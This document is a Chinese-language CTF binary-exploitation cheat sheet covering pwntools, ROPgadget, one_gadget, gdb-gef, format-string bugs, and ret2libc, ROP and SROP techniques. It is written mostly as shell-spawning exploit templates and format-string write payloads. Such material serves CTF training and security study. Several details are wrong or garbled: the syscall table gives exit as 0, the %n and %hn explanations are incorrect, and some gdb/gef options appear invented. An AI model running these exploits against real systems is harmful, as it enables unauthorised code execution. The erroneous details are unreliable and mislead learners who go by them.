# Pwn 工具速查

<!-- 目录 -->
<!-- 1. pwntools -->
<!-- 2. checksec -->
<!-- 3. ROPgadget -->
<!-- 4. one_gadget -->
<!-- 5. gdb-gef -->
<!-- 6. 格式化字符串 -->
<!-- 7. 常见漏洞利用 -->

---

## 1. pwntools

pwntools 是 Python 中最常用的漏洞利用框架。

### 基础使用

```python
#!/usr/bin/env python3
from pwn import *

# 设置目标
# p = remote('host', port)  # 远程连接
# p = process('./binary')   # 本地进程
# gdb.attach(p, gdbscript='')  # 附加调试

# 常用上下文设置
context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='info')

# 发送和接收
p.sendline(b'payload')
p.send(b'payload')
p.recvuntil(b'Welcome')
p.recvline()
p.recv(1024)

# 交互模式
p.interactive()

# 关闭
p.close()
```

### ELF 操作

```python
# 加载 ELF
elf = ELF('./binary')

# 获取符号地址
puts_plt = elf.plt['puts']
gets_got = elf.got['gets']
main_addr = elf.symbols['main']

# 读取任意地址
print(hex(next(elf.search(b'/bin/sh'))))

# 查看 got/plt
elf.got
elf.plt
```

### 常用函数

| 函数 | 说明 |
|------|------|
| `cyclic(100)` | 生成 100 字节的循环字符串 |
| `cyclic_find(0x6161)` | 找到 offset |
| `flat([a, b, c])` | 打包多个值为字节 |
| `pack(0x1234)` | 打包为字节 (小端序) |
| `unpack()` | 解包字节为整数 |
| `p64()`, `p32()`, `p16()`, `p8()` | 打包 |
| `u64()`, `u32()`, `u16()`, `u8()` | 解包 |
| `ROP(elf)` | 创建 ROP 对象 |

### 完整示例

```python
#!/usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

# 连接
p = remote('target.com', 12345)
# p = process('./vulnerable_binary')

# Leak libc address
p.sendlineafter(b'Input:', b'A' * 100)
p.recvuntil(b'A' * 100)
leaked_addr = u64(p.recv(6) + b'\x00\x00')
log.info(f'Leaked address: {hex(leaked_addr)}')

# 计算偏移
offset = 200

# 构造 payload
payload = flat([
    b'A' * offset,
    canary,      # 如果有 canary
    b'B' * 8,    # rbp
    rop_rdi,     # ROP gadget: pop rdi; ret
    got_addr,    # 要泄露的 got 地址
    plt_addr,    # plt 地址 (puts/system)
    main_addr,   # 返回地址
])

# 发送
p.sendline(payload)

# 获取 flag
p.interactive()
```

---

## 2. checksec

checksec 用于检查二进制文件的安全保护机制。

```bash
# 检查单个文件
checksec --file=./binary

# 检查运行中的进程
checksec --pid=1234
```

### 常见保护机制

| 保护 | 关闭参数 | 说明 |
|------|----------|------|
| CANARY | `-fno-stack-protector` | 栈保护 cookie |
| FORTIFY | `-D_FORTIFY_SOURCE=0` | 数组边界检查 |
| NX` | `-z execstack` | 禁用不可执行栈 |
| PIE | `-no-pie` | 禁用地址随机化 |
| RELRO | `-Wl,-z,norelro` | GOT 写保护 |

### 各保护详解

```bash
# Canary
# 函数返回前检查栈 cookie 是否被修改
# 绕过方法: leak canary, 或覆写为原值

# NX (No-eXecute)
# 栈/堆/数据段不可执行
# 绕过方法: ROP (Return-Oriented Programming)

# PIE (Position Independent Executable)
# 程序加载地址随机化
# 绕过方法: leak 地址计算偏移

# RELRO (RELocation Read-Only)
# Partial RELRO: GOT 可写
# Full RELRO: GOT 只读, 禁止函数指针覆写
# 绕过方法: Partial RELRO 可覆写 GOT
```

---

## 3. ROPgadget

ROPgadget 用于查找二进制文件中的 ROP gadget。

```bash
# 查找所有 gadgets
ROPgadget --binary=./binary

# 查找特定指令
ROPgadget --binary=./binary | grep "pop rdi"

# 查找 /bin/sh
ROPgadget --binary=./binary --string "/bin/sh"

# 查找 call/jmp 指令
ROPgadget --binary=./binary --only "call|jmp"

# 输出为 ropper 格式
ROPgadget --binary=./binary --ropchain
```

### 常用 Gadget

```bash
# amd64 常用 gadgets
pop rdi; ret           # 设置第一个参数
pop rsi; pop r15; ret  # 设置第二个参数
pop rdx; ret           # 设置第三个参数
pop rax; ret           # 设置返回值
syscall; ret           # 执行系统调用

# i386 常用 gadgets
pop edi; ret           # 设置第一个参数
pop esi; ret           # 设置第二个参数
pop edx; ret           # 设置第三个参数
pop eax; ret           # 设置系统调用号
int 0x80; ret          # 执行系统调用
```

### 构建 ROP Chain

```python
# 使用 pwntools ROP
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# 构建 ROP chain
rop.raw(b'A' * offset)       # padding
rop.call('puts', [elf.got['puts']])  # leak libc
rop.call('main')              # 返回继续利用

# 输出
print(rop.dump())
print(rop.chain())
```

---

## 4. one_gadget

one_gadget 用于查找 libc 中的 execve('/bin/sh', NULL, NULL) 调用。

```bash
# 查找 one_gadget
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# 常用参数
one_gadget -f libc.so.6    # 指定 libc
one_gadget -l 100 libc.so.6  # 只显示前 100 个

# 示例输出
# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# 0x10a38c execve("/bin/sh", rsp+0x40, environ)

# constraints (约束条件)
# [rsp+0x40] == NULL
# [rsp] == NULL
# rcx == NULL
```

### 验证 Gadget

找到 one_gadget 后,需要验证约束条件是否满足:

```python
# 通常需要配合 ROP 设置合适的寄存器值
# 如果约束是 [rsp+0x40] == NULL, 需要确保 rsp+0x40 是 NULL
```

---

## 5. gdb-gef

gef (GDB Enhanced Features) 是 GDB 的插件,提供更好的调试体验。

### 常用命令

| 命令 | 说明 |
|------|------|
| `gef` | 显示帮助 |
| `gef-config` | 查看配置 |
| `gef-set` | 设置配置 |
| `context` | 显示上下文 |
| `registers` | 显示寄存器 |
| `stack` | 显示栈 |
| `heap` | 显示堆信息 |
| `vmmap` | 显示内存映射 |
| `checksec` | 检查保护 |
| `got` | 显示 GOT 表 |
| `plt` | 显示 PLT 表 |

### 常用调试命令

```gdb
# 启动调试
gdb ./binary

# 带参数
gdb --args ./binary arg1 arg2

# 带环境变量
gdb --env FO0=bar ./binary

# 附加到进程
gdb -p PID

# 设置断点
break main
break *0x400123
break function_name

# 条件断点
break main if $rdi == 1

# 查看内存
x/10x 0x400000
x/s 0x400000
x/wx 0x400000
x/gx 0x400000

# 修改内存
set {int}0x400000 = 10

# 修改寄存器
set $rax = 0

# 继续执行
continue
c

# 单步执行
stepi (si)
nexti (ni)

# 查看栈帧
backtrace (bt)
frame 1

# 查找内存地址属于哪个映射
info proc map
vmmap

# 搜索内存
search-pattern "pattern"
find /b 0x400000, +0x1000, 0x41414141

# ROP 利用辅助
rop
ropchain
```

### 漏洞利用辅助

```gdb
# 生成 patterns
pattern create 200
pattern offset 0x41414141

# 检测漏洞
checksec

# heap 利用辅助
heap
arena
heap analysis
fastbin attack
unsortedbin attack
```

---

## 6. 格式化字符串

格式化字符串漏洞允许用户输入成为 printf 的格式化字符串。

### 基础

```c
// 漏洞代码
printf(user_input);  // user_input = "%x %x %x"

// 泄露栈内容
printf("%x %x %x %x %x %x %x %x")

// 泄露任意地址 (需要知道地址)
printf("%s", target_addr)
```

### pwntools 格式化字符串工具

```python
from pwn import *

# 生成格式化字符串 payload
payload = fmtstr_payload(offset, {got_addr: value})

# 自动计算 offset
payload = fmtstr_payload(6, {printf_got: system_addr})

# 写入单个地址
# 写入 0x12345678 到 0x601000
payload = fmtstr_payload(6, {0x601000: 0x12345678}, write_size='short')

# write_size: 'byte' (1), 'short' (2), 'int' (4)
```

### 常用格式化字符串 Payload

```bash
# 泄露栈内容
AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x

# 确定偏移
# 在输出中找 AAAA (0x41414141) 的位置

# %s 泄露任意地址
# 先用 %x 找到偏移位置
# 然后用 %s 泄露指定地址

# %n 写入
# 写入字节数到指定地址
AAAA%10$n    # 把 4 (AAAA的长度) 写入第 10 个参数指向的地址
AAAA%10$08n  # 写入 8 字节

# 格式化字符串写内存
# 偏移 7 处是目标地址,写入 0x1234
%4896c%7$hn
# 原理: 4896 = 0x1320, 分两次写: 0x20 = 32, 0x13 = 19
```

---

## 7. 常见漏洞利用技术

### Ret2libc

```python
#!/usr/bin/env python3
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Stage 1: Leak libc address
payload = flat([
    b'A' * offset,
    pop_rdi,           # ROP gadget
    elf.got['puts'],   # 参数1: puts@got
    elf.plt['puts'],   # 调用 puts
    elf.symbols['main'] # 返回 main
])
p.sendline(payload)
puts_addr = u64(p.recv(6) + b'\x00\x00')
log.info(f'puts @ {hex(puts_addr)}')

# 计算 libc base
libc.address = puts_addr - libc.symbols['puts']
log.info(f'libc @ {hex(libc.address)}')

# Stage 2: system('/bin/sh')
payload = flat([
    b'A' * offset,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.symbols['system'],
    0x0  # return address (optional)
])
p.sendline(payload)
p.interactive()
```

### ROP (Return-Oriented Programming)

```python
# 绕过 PIE + NX
# 需要先 leak 地址确定基址

# 构建 ROP chain
rop = ROP(elf)
rop.raw(b'A' * offset)  # padding
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])

# 获取 raw bytes
payload = rop.chain()
```

### SROP (Sigreturn-Oriented Programming)

```python
# 利用 sigreturn 系统调用
# 适用于 amd64

# Frame construction
frame = SigreturnFrame(kernel_ia64=False)
frame.rdi = libc.address + next(libc.search(b'/bin/sh'))
frame.rax = 59  # execve
frame.rsi = 0
frame.rdx = 0
frame.rip = libc.address + libc.symbols['syscall']
frame.rsp = libc.address + 0x1000  # 指向 frame

# 或者直接使用 syscall gadget
SYSCALL = 0x400123  # syscall gadget
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = binsh_addr
frame.rip = SYSCALL
```

### Ret2dl-resolve

```python
# 动态链接延迟解析
# 绕过 Full RELRO

# Stage 1: leak
# Stage 2: 伪造 resolver 绕过验证
```

### Canary Bypass

```python
# 方法1: Leak canary
# 在输入开始处放入 canary 位置的特征字节
# 在输出中找特征字节位置,即为 canary offset

# 方法2: 覆写 canary 最后一个字节
# canary 通常以 00 结尾
# 修改为 00 xx 可以绕过 strcmp 等函数检查
```

---

## 常用汇编指令

### amd64

| 指令 | 说明 |
|------|------|
| `pop rax` | 弹出栈顶到 rax |
| `push rax` | 压入 rax 到栈 |
| `mov rdi, rax` | 赋值 |
| `add rsp, 8` | 调整栈指针 |
| `sub rsp, 8` | 分配栈空间 |
| `syscall` | 系统调用 |
| `ret` | 返回 |

### i386

| 指令 | 说明 |
|------|------|
| `pop eax` | 弹出栈顶到 eax |
| `push eax` | 压入 eax 到栈 |
| `int 0x80` | 系统调用 |

### 系统调用号 (amd64)

| 调用号 | 函数 | 说明 |
|--------|------|------|
| 0 | read | 读取 |
| 1 | write | 写入 |
| 2 | open | 打开文件 |
| 0 | exit | 退出 |
| 59 | execve | 执行程序 |
| 60 | exit_group | 进程退出 |

### 系统调用号 (i386)

| 调用号 | 函数 |
|--------|------|
| 1 | exit |
| 3 | read |
| 4 | write |
| 5 | open |
| 6 | close |

---

## 常见漏洞缓解措施

| 措施 | 说明 | 绕过方法 |
|------|------|----------|
| ASLR | 地址随机化 | leak 地址 |
| Stack Canary | 栈保护 | leak/overwrite |
| NX | 不可执行 | ROP |
| PIE | 代码地址随机化 | leak |
| RELRO | GOT 只读 | partial relro |
| Seccomp | 系统调用过滤 | 查找可用的 syscall |
